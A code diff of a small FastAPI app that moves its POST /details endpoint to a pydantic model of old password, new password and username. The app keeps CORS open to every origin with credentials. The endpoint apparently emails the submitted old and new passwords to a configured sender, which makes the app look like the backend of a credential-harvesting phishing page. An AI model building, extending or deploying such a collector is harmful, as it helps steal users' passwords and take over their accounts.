@@ -4,6 +4,14 @@ import smtplib
 from email.mime.text import MIMEText
 from dotenv import load_dotenv
 import os
+from pydantic import BaseModel
+
+
+class Details(BaseModel):
+    old_password: str
+    new_password: str
+    username: str = None
+
 
 load_dotenv()
 app = FastAPI()
@@ -11,10 +19,10 @@ app = FastAPI()
 # Allow all origins (CORS open for everyone)
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["*"],       # Allow all origins
+    allow_origins=["*"],  # Allow all origins
     allow_credentials=True,
-    allow_methods=["*"],       # Allow all HTTP methods
-    allow_headers=["*"],       # Allow all headers
+    allow_methods=["*"],  # Allow all HTTP methods
+    allow_headers=["*"],  # Allow all headers
 )
 
 SENDER = os.getenv("SENDER")
@@ -30,8 +38,8 @@ def home():
 
 
 @app.post("/details")
-def get_details(old_password: str, new_password: str, username: str = None):
-    send_email(old_password, new_password, username)
+def get_details(details: Details):
+    send_email(details.old_password, details.new_password, details.username)
     return {"message": "email has been sent successfully"}
 
 
